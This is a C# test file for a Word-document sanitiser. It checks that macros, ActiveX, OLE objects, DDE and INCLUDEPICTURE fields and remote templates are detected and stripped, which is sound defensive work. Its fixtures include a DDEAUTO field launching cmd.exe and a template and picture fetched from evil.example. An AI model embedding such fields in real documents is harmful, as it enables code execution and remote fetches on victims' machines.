using System.Text;
using Avig.OpenXml;
using DocumentFormat.OpenXml.Packaging;

namespace Avig.Ord.Tests;

/// <summary>
/// What can act on its own or fetch something when Word opens a file, made with the Open XML SDK
/// as Word stores it: found by the document model and the streaming reader alike, and taken out
/// by RemoveActiveContent so that the saved file still passes the schema validator.
/// </summary>
public class ActiveContentTests
{
    private const string Vml = "xmlns:v=\"urn:schemas-microsoft-com:vml\" xmlns:o=\"urn:schemas-microsoft-com:office:office\"";
    private const string AttachedTemplate = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate";
    private const string OleObject = "http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject";

    public static TheoryData<string, ActiveContent> Kinds => new()
    {
        { "plain", ActiveContent.None },
        { "macros", ActiveContent.Macros },
        { "activex", ActiveContent.ActiveX },
        { "ole", ActiveContent.EmbeddedObjects },
        { "altchunk", ActiveContent.EmbeddedObjects },
        { "dde", ActiveContent.ActiveFields },
        { "includepicture", ActiveContent.ActiveFields },
        { "template", ActiveContent.ExternalReferences },
        { "linked-ole", ActiveContent.ExternalReferences },
        { "hyperlink", ActiveContent.None },
    };

    [Theory]
    [MemberData(nameof(Kinds))]
    public async Task The_document_model_and_the_reader_find_the_same_active_content(string kind, ActiveContent expected)
    {
        byte[] file = await FileWithAsync(kind);
        OrdDocument document = await TestFiles.OpenAsync(file);

        Assert.Equal(expected, document.ActiveContent);

        Result<DocxReader> opened = await DocxReader.OpenAsync(new MemoryStream(file));
        Assert.True(opened.IsSuccess(out DocxReader? reader), opened.Error);

        await using (reader)
        {
            Assert.Equal(expected, await reader.GetActiveContentAsync());
            Assert.Equal(document.ExternalReferences.Count, (await reader.GetExternalReferencesAsync()).Count);
        }
    }

    [Theory]
    [MemberData(nameof(Kinds))]
    public async Task Removing_active_content_leaves_a_valid_file_with_none(string kind, ActiveContent found)
    {
        byte[] file = await FileWithAsync(kind);
        OrdDocument document = await TestFiles.OpenAsync(file);
        Assert.Equal(found, document.ActiveContent);

        document.RemoveActiveContent();
        byte[] saved = await TestFiles.SaveAsync(document);
        OrdDocument reopened = await TestFiles.OpenAsync(saved);

        Assert.Equal(ActiveContent.None, document.ActiveContent);
        Assert.Equal(ActiveContent.None, reopened.ActiveContent);
        Assert.Empty(reopened.ExternalReferences);
        Assert.Equal(WordFileKind.Document, reopened.Kind);
        Assert.Contains("Före", reopened.Text, StringComparison.Ordinal);
        Assert.Contains("Efter", reopened.Text, StringComparison.Ordinal);
        TestFiles.AssertValid(saved);
    }

    [Fact]
    public async Task Removing_active_content_takes_the_parts_and_the_references_out()
    {
        byte[] file = await FileWithAsync("everything");
        OrdDocument document = await TestFiles.OpenAsync(file);
        Assert.Equal(ActiveContent.Macros | ActiveContent.ActiveX | ActiveContent.EmbeddedObjects | ActiveContent.ActiveFields | ActiveContent.ExternalReferences, document.ActiveContent);
        Assert.Equal(2, document.ExternalReferences.Count);
        Assert.Contains(document.ExternalReferences, item => item.Kind == "attachedTemplate" && item.SourcePart == "word/settings.xml");

        document.RemoveActiveContent();
        byte[] saved = await TestFiles.SaveAsync(document);

        using WordprocessingDocument sdk = WordprocessingDocument.Open(new MemoryStream(saved), false);
        MainDocumentPart main = sdk.MainDocumentPart!;
        Assert.Empty(main.EmbeddedObjectParts);
        Assert.Empty(main.EmbeddedControlPersistenceParts);
        Assert.Empty(main.AlternativeFormatImportParts);
        Assert.Null(main.VbaProjectPart);
        Assert.DoesNotContain(main.ExternalRelationships, relationship => relationship.RelationshipType != OpcNamespaces.HyperlinkRelationship);
        Assert.Empty(main.DocumentSettingsPart!.ExternalRelationships);
        Assert.Single(main.HyperlinkRelationships);

        // The SDK names the main part of a macro-enabled document itself, so the parts are found through it.
        string body = new StreamReader(main.GetStream()).ReadToEnd();
        string settings = new StreamReader(main.DocumentSettingsPart.GetStream()).ReadToEnd();
        Assert.DoesNotContain("OLEObject", body, StringComparison.Ordinal);
        Assert.DoesNotContain("w:control", body, StringComparison.Ordinal);
        Assert.DoesNotContain("altChunk", body, StringComparison.Ordinal);
        Assert.DoesNotContain("DDEAUTO", body, StringComparison.Ordinal);
        Assert.DoesNotContain("INCLUDEPICTURE", body, StringComparison.Ordinal);
        Assert.DoesNotContain("attachedTemplate", settings, StringComparison.Ordinal);

        // The picture an OLE object showed stays, and so does the text a field last showed.
        Assert.Single(main.ImageParts);
        Assert.Contains("v:imagedata", body, StringComparison.Ordinal);
        Assert.Contains("Senast visat", TestFiles.SdkText(saved), StringComparison.Ordinal);
        TestFiles.AssertValid(saved);
    }

    [Fact]
    public async Task Fields_that_do_nothing_on_their_own_are_kept()
    {
        const string body = """
            <w:p><w:r><w:t>Före</w:t></w:r><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> PAGE </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>1</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r><w:fldSimple w:instr=" DATE \@ &quot;yyyy-MM-dd&quot; "><w:r><w:t>2026-11-25</w:t></w:r></w:fldSimple><w:r><w:t>Efter</w:t></w:r></w:p>
            """;
        OrdDocument document = await TestFiles.OpenAsync(TestFiles.Docx(body));

        Assert.Equal(ActiveContent.None, document.ActiveContent);

        document.RemoveActiveContent();
        string saved = Encoding.UTF8.GetString(await ReaderTests.PartAsync(await TestFiles.SaveAsync(document), "word/document.xml"));
        Assert.Contains("PAGE", saved, StringComparison.Ordinal);
        Assert.Contains("DATE", saved, StringComparison.Ordinal);
    }

    [Theory]
    [InlineData(" DDE Excel \"C:\\\\a.xlsx\" A1", true)]
    [InlineData("ddeauto c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\"", true)]
    [InlineData("INCLUDEPICTURE \"http://evil.example/a.png\" \\d", true)]
    [InlineData("INCLUDETEXT \"\\\\\\\\server\\\\share\\\\a.docx\"", true)]
    [InlineData("LINK Excel.Sheet.8 \"a.xls\" \"\" \\a", true)]
    [InlineData("IMPORT a.wmf", true)]
    [InlineData("MACROBUTTON Run Klicka", true)]
    [InlineData("PAGE", false)]
    [InlineData("HYPERLINK \"https://example.com\"", false)]
    [InlineData("DDEX", false)]
    [InlineData("", false)]
    public void Field_instructions_are_told_apart(string instruction, bool active)
    {
        Assert.Equal(active, ActiveContentRules.IsActiveField(instruction));
    }

    [Fact]
    public async Task Reading_the_active_content_does_not_change_what_is_saved()
    {
        byte[] file = await FileWithAsync("dde");
        OrdDocument document = await TestFiles.OpenAsync(file);

        Assert.Equal(ActiveContent.ActiveFields, document.ActiveContent);
        byte[] saved = await TestFiles.SaveAsync(document);

        Assert.Equal(await ReaderTests.PartAsync(file, "word/document.xml"), await ReaderTests.PartAsync(saved, "word/document.xml"));
    }

    [Fact]
    public async Task Removing_macros_leaves_no_relationship_to_the_removed_project()
    {
        byte[] file = await ReaderTests.ConvertToMacroAsync(TestFiles.Docx("<w:p><w:r><w:t>Makro</w:t></w:r></w:p>"));
        OrdDocument document = await TestFiles.OpenAsync(file);

        document.RemoveMacros();
        byte[] saved = await TestFiles.SaveAsync(document);

        // Before, the relationship to word/vbaProject.bin was saved without the part.
        Result<OpcPackage> opened = await OpcPackage.OpenAsync(new MemoryStream(saved));
        Assert.True(opened.IsSuccess(out OpcPackage? package), opened.Error);

        await using (package)
        {
            Assert.DoesNotContain(await package.GetRelationshipsAsync("word/document.xml"), relationship => relationship.Target.Contains("vbaProject", StringComparison.Ordinal) == true);
        }

        TestFiles.AssertValid(saved);
    }

    /// <summary>A document with "Före" and "Efter" around one kind of active content, or all of them for "everything".</summary>
    internal static async Task<byte[]> FileWithAsync(string kind)
    {
        bool all = kind == "everything";
        StringBuilder body = new("<w:p><w:r><w:t>Före</w:t></w:r></w:p>");

        if (all == true || kind == "activex")
        {
            body.Append($"""<w:p><w:r><w:object {Vml}><v:shape id="_x0000_i1026" type="#_x0000_t75" style="width:60pt;height:20pt"/><w:control r:id="rIdAx" w:name="CommandButton1" w:shapeid="_x0000_i1026"/></w:object></w:r></w:p>""");
        }

        if (all == true || kind == "ole")
        {
            body.Append($"""<w:p><w:r><w:object {Vml} w:dxaOrig="1440" w:dyaOrig="1440"><v:shape id="_x0000_i1025" type="#_x0000_t75" style="width:72pt;height:72pt" o:ole=""><v:imagedata r:id="rIdImg" o:title=""/></v:shape><o:OLEObject Type="Embed" ProgID="Package" ShapeID="_x0000_i1025" DrawAspect="Icon" ObjectID="_1700000001" r:id="rIdOle"/></w:object></w:r></w:p>""");
        }

        if (all == true || kind == "linked-ole")
        {
            body.Append($"""<w:p><w:r><w:object {Vml} w:dxaOrig="1440" w:dyaOrig="1440"><v:shape id="_x0000_i1027" type="#_x0000_t75" style="width:72pt;height:72pt" o:ole=""/><o:OLEObject Type="Link" ProgID="Excel.Sheet.12" ShapeID="_x0000_i1027" DrawAspect="Content" ObjectID="_1700000002" r:id="rIdLink" UpdateMode="Always"/></w:object></w:r></w:p>""");
        }

        if (all == true || kind == "altchunk")
        {
            body.Append("""<w:altChunk r:id="rIdChunk"/>""");
        }

        if (all == true || kind == "dde")
        {
            body.Append("""<w:p><w:r><w:fldChar w:fldCharType="begin"/></w:r><w:r><w:instrText xml:space="preserve"> DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc" </w:instrText></w:r><w:r><w:fldChar w:fldCharType="separate"/></w:r><w:r><w:t>Senast visat</w:t></w:r><w:r><w:fldChar w:fldCharType="end"/></w:r></w:p>""");
        }

        if (all == true || kind == "includepicture")
        {
            body.Append("""<w:p><w:fldSimple w:instr=" INCLUDEPICTURE &quot;http://evil.example/a.png&quot; \d "><w:r><w:t>Bild</w:t></w:r></w:fldSimple></w:p>""");
        }

        if (all == true || kind == "hyperlink")
        {
            body.Append("""<w:p><w:hyperlink r:id="rIdLinkWeb"><w:r><w:t>Länk</w:t></w:r></w:hyperlink></w:p>""");
        }

        body.Append("<w:p><w:r><w:t>Efter</w:t></w:r></w:p>");

        byte[] file = TestFiles.Docx(body.ToString(), extra: main =>
        {
            if (all == true || kind == "activex")
            {
                EmbeddedControlPersistencePart control = main.AddNewPart<EmbeddedControlPersistencePart>(OpcNamespaces.ActiveXContentType, "rIdAx");
                TestFiles.Write(control, """<ax:ocx ax:classid="{D7053240-CE69-11CD-A777-00DD01143C57}" ax:persistence="persistPropertyBag" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX"/>""");
            }

            if (all == true || kind == "ole")
            {
                EmbeddedObjectPart ole = main.AddNewPart<EmbeddedObjectPart>(OpcNamespaces.OleObjectContentType, "rIdOle");

                using (Stream stream = ole.GetStream(FileMode.Create))
                {
                    stream.Write([0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1]);
                }

                ImagePart image = main.AddNewPart<ImagePart>("image/png", "rIdImg");

                using Stream picture = image.GetStream(FileMode.Create);
                picture.Write(WriterTests.Png);
            }

            if (all == true || kind == "linked-ole")
            {
                main.AddExternalRelationship(OleObject, new Uri("file://server/share/book.xlsx"), "rIdLink");
            }

            if (all == true || kind == "altchunk")
            {
                AlternativeFormatImportPart chunk = main.AddAlternativeFormatImportPart(AlternativeFormatImportPartType.Html, "rIdChunk");

                using Stream stream = chunk.GetStream(FileMode.Create);
                stream.Write("<html><body><p>Importerad</p></body></html>"u8);
            }

            if (all == true || kind == "template")
            {
                DocumentSettingsPart settings = main.AddNewPart<DocumentSettingsPart>();
                settings.AddExternalRelationship(AttachedTemplate, new Uri("https://evil.example/template.dotm"), "rIdTemplate");
                TestFiles.Write(settings, $"""<w:settings xmlns:w="{TestFiles.Wml}" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><w:attachedTemplate r:id="rIdTemplate"/></w:settings>""");
            }

            if (all == true || kind == "hyperlink")
            {
                main.AddHyperlinkRelationship(new Uri("https://example.com/"), true, "rIdLinkWeb");
            }
        });

        if (all == true || kind == "macros")
        {
            file = await ReaderTests.ConvertToMacroAsync(file);
        }

        return file;
    }
}
